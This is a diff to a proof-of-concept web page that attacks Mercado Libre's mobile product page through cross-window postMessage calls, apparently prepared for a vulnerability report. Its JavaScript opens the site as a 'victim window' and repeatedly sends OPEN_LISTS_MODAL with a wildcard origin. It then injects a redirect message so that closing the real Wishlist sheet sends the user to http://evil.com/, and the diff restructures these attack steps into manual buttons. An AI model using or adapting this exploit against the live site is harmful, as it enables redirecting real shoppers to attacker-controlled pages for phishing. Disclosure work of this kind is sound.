@@ -136,17 +136,22 @@
 
         <div class="actions">
           <button id="open">
-            <strong>1. Open Mercado Libre and start the trigger</strong>
-            <span>Opens the mobile product page and automatically retries OPEN_LISTS_MODAL.</span>
+            <strong>1. Open Mercado Libre</strong>
+            <span>Wait until the mobile product page has fully loaded.</span>
+          </button>
+
+          <button id="wishlist" disabled>
+            <strong>2. Open Wishlist</strong>
+            <span>Click once. A bounded retry loop keeps delivering OPEN_LISTS_MODAL.</span>
           </button>
 
           <button id="inject" disabled>
-            <strong>2. Set external redirect</strong>
+            <strong>3. Set external redirect</strong>
             <span>Use this only after the genuine Wishlist sheet is visible.</span>
           </button>
 
           <button id="focus" disabled>
-            <strong>3. Focus victim window</strong>
+            <strong>4. Focus victim window</strong>
             <span>Close Wishlist with the normal X button to trigger the redirect.</span>
           </button>
         </div>
@@ -158,9 +163,9 @@
         <h2>Recording sequence</h2>
         <ol>
           <li>Use a mobile User-Agent and your own logged-in test session.</li>
-          <li>Click step 1 once. The PoC opens the product and starts a bounded automatic trigger.</li>
-          <li>Stay on the victim window until the genuine Wishlist sheet appears.</li>
-          <li>Return here and use step 2 to set the external destination.</li>
+          <li>Use step 1 to open the product and wait until it has fully loaded.</li>
+          <li>Return here and click step 2 once. Stay on the victim window until Wishlist appears.</li>
+          <li>Return here and use step 3 to set the external destination.</li>
           <li>Close Wishlist with its X button.</li>
           <li>The same window should navigate to <code>http://evil.com/</code>.</li>
         </ol>
@@ -178,10 +183,10 @@
     <script>
       let victim = null;
       let wishlistTimer = null;
-      let wishlistDelayTimer = null;
 
       const status = document.querySelector('#status');
       const log = document.querySelector('#log');
+      const wishlistButton = document.querySelector('#wishlist');
       const injectButton = document.querySelector('#inject');
       const focusButton = document.querySelector('#focus');
 
@@ -201,9 +206,7 @@
       }
 
       function stopWishlistTrigger() {
-        if (wishlistDelayTimer) window.clearTimeout(wishlistDelayTimer);
         if (wishlistTimer) window.clearInterval(wishlistTimer);
-        wishlistDelayTimer = null;
         wishlistTimer = null;
       }
 
@@ -222,10 +225,8 @@
           sent += 1;
         };
 
-        wishlistDelayTimer = window.setTimeout(() => {
-          send();
-          wishlistTimer = window.setInterval(send, 750);
-        }, 5500);
+        send();
+        wishlistTimer = window.setInterval(send, 750);
       }
 
       document.querySelector('#open').addEventListener('click', () => {
@@ -239,19 +240,35 @@
           return;
         }
 
-        injectButton.disabled = false;
+        wishlistButton.disabled = false;
+        injectButton.disabled = true;
         focusButton.disabled = false;
-        startWishlistTrigger();
         log.textContent = [
           '[1] Victim window opened',
           'sender: ' + location.origin,
           'target: ' + target,
-          'WindowProxy retained: true',
-          '',
-          '[trigger] OPEN_LISTS_MODAL starts after 5.5 seconds',
-          'maximum retry window: 40 messages'
+          'WindowProxy retained: true'
         ].join('\n');
-        setStatus('Automatic Wishlist trigger running. Stay on the Mercado Libre window until Wishlist appears.', 'success');
+        setStatus('Victim opened. Wait until the product is fully loaded, then return for step 2.', 'success');
+        victim.focus();
+      });
+
+      wishlistButton.addEventListener('click', () => {
+        if (!victimAvailable()) {
+          setStatus('Victim window is unavailable. Repeat step 1.', 'error');
+          return;
+        }
+
+        startWishlistTrigger();
+        wishlistButton.disabled = true;
+        injectButton.disabled = false;
+        appendLog([
+          '',
+          '[2] OPEN_LISTS_MODAL trigger started',
+          "victim.postMessage('OPEN_LISTS_MODAL', '*');",
+          'maximum retry window: 40 messages'
+        ]);
+        setStatus('Wishlist trigger running. Stay on Mercado Libre until the genuine sheet appears.', 'success');
         victim.focus();
       });
 
@@ -277,11 +294,11 @@
         }
         appendLog([
           '',
-          '[2] Redirect message sent',
+          '[3] Redirect message sent',
           JSON.stringify(message, null, 2),
           'synchronous copies sent: 3',
           '',
-          '[3] Close Wishlist with its X button.'
+          '[4] Close Wishlist with its X button.'
         ]);
         setStatus('Redirect armed. Wait one second, then close Wishlist with the normal X button.', 'success');
         victim.focus();
